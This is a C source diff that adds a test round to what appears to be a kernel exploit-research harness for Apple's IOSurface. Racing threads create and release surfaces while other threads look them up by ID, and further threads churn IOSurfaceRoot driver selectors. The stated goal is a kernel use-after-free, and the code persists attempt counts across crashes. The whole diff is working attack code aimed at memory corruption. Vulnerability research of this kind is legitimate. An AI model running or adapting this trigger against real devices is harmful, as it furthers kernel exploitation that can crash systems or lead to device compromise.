@@ -1635,6 +1635,79 @@ static void *p13_render_loop(void *arg) {
     return NULL;
 }
 
+/* r258: IOSurfaceLookup race — race between lookup-by-ID and release */
+static volatile int r258_run = 0;
+static volatile int r258_created = 0;
+static volatile int r258_lookup_ok = 0;
+static volatile int r258_lookup_stale = 0;
+static volatile IOSurfaceID r258_target_id = 0;
+static volatile int r258_phase = 0; /* 0=idle, 1=surface_live, 2=releasing */
+
+static void *r258_create_release(void *arg) {
+    (void)arg;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 64, h = 64, bpe = 4, bpr = w * bpe, pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    while (r258_run) {
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        if (!surf) continue;
+        IOSurfaceID sid = IOSurfaceGetID(surf);
+        r258_target_id = sid;
+        __sync_synchronize();
+        r258_phase = 1;
+        __sync_fetch_and_add(&r258_created, 1);
+
+        /* Brief window for lookup threads to grab references */
+        for (volatile int i = 0; i < 50; i++) {}
+
+        /* Signal that we're about to release */
+        r258_phase = 2;
+        __sync_synchronize();
+        CFRelease(surf); /* This triggers kernel-side IOSurface deallocation */
+        r258_phase = 0;
+    }
+    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
+    CFRelease(props);
+    return NULL;
+}
+
+static void *r258_lookup_thread(void *arg) {
+    (void)arg;
+    while (r258_run) {
+        if (r258_phase == 0) { sched_yield(); continue; }
+        IOSurfaceID sid = r258_target_id;
+        if (sid == 0) continue;
+
+        /* Race: try to lookup while other thread is releasing */
+        IOSurfaceRef found = IOSurfaceLookup(sid);
+        if (found) {
+            /* Check if the surface is still valid by accessing it */
+            size_t aw = IOSurfaceGetWidth(found);
+            size_t ah = IOSurfaceGetAllocSize(found);
+            int32_t uc = IOSurfaceGetUseCount(found);
+
+            if (r258_phase == 2 || r258_phase == 0) {
+                /* We got a ref during/after release phase — potential stale ref */
+                __sync_fetch_and_add(&r258_lookup_stale, 1);
+            }
+            __sync_fetch_and_add(&r258_lookup_ok, 1);
+            CFRelease(found);
+        }
+    }
+    return NULL;
+}
+
 /* r257: encoder invalidation race — submit frames then tear down encoder mid-flight */
 static volatile int r257_run = 0;
 static volatile int r257_panics = 0;
@@ -20123,6 +20196,72 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 258) {
+            rlog("*** rounds=258: IOSurfaceLookup race UAF ***\n");
+            rlog("  Thread A: create IOSurface → publish ID → release\n");
+            rlog("  Threads B+C+D: IOSurfaceLookup(ID) during release window\n");
+            rlog("  Race: lookup returns ref to surface being freed\n\n");
+
+            char r258_sp[256];
+            { char *h = getenv("HOME"); snprintf(r258_sp, sizeof(r258_sp), "%s/Documents/uaf258_state.bin", h?h:"/tmp"); }
+            int r258_att = 0;
+            { FILE *f = fopen(r258_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0258) fread(&r258_att,4,1,f); fclose(f); } }
+            r258_att++;
+            rlog("  Attempt #%d\n", r258_att);
+            { FILE *f = fopen(r258_sp, "wb"); if (f) { uint32_t m=0xDEAD0258; fwrite(&m,4,1,f); fwrite(&r258_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r258_secs = 15;
+            if (argc > 3) r258_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r258_secs);
+            fflush(stdout);
+
+            r258_run = 1; r258_phase = 0; r258_target_id = 0;
+            r258_created = 0; r258_lookup_ok = 0; r258_lookup_stale = 0;
+
+            pthread_t r258_cr, r258_lu[3];
+            pthread_create(&r258_cr, NULL, r258_create_release, NULL);
+            for (int i = 0; i < 3; i++)
+                pthread_create(&r258_lu[i], NULL, r258_lookup_thread, NULL);
+
+            /* sel17/18 churn */
+            io_service_t r258_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r258_conn = IO_OBJECT_NULL;
+            if (r258_svc) IOServiceOpen(r258_svc, mach_task_self(), 0, &r258_conn);
+            pthread_t r258_t17, r258_t18;
+            if (r258_conn) {
+                g_race250_conn = r258_conn;
+                g_race250_run = 1;
+                g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+                g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+                pthread_create(&r258_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r258_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r258_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds created=%d lookup=%d stale=%d reg=%d/%d\n", s+1,
+                     r258_created, r258_lookup_ok, r258_lookup_stale,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r258_run = 0;
+            g_race250_run = 0;
+            pthread_join(r258_cr, NULL);
+            for (int i = 0; i < 3; i++) pthread_join(r258_lu[i], NULL);
+            if (r258_conn) {
+                pthread_join(r258_t17, NULL);
+                pthread_join(r258_t18, NULL);
+                IOServiceClose(r258_conn);
+                IOObjectRelease(r258_svc);
+            }
+
+            rlog("\n  === SURVIVED IOSurfaceLookup race! ===\n");
+            rlog("  Total: created=%d lookup=%d stale=%d\n",
+                 r258_created, r258_lookup_ok, r258_lookup_stale);
+            rlog("*** r=258 complete ***\n");
             goto done;
         }
         if (rounds == 257) {
